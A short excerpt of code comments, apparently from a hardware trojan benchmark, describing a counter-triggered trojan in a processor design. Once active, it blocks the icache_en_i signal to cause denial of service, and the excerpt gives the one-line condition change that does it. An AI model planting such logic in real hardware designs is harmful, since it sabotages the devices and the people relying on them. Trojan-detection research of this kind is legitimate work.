 ...
 * 
 * Description:
 *   Disables operations by blocking icache_en_i control signal
 *   
 * Trigger: Counter on icache_en_i
 * Payload: Block icache_en_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block icache_en_i when trojan is active
//
// IMPORTANT: icache_en_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (icache_en_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: icache_en_i && 0 = 0 (always false)
//   All operations controlled by icache_en_i are blocked
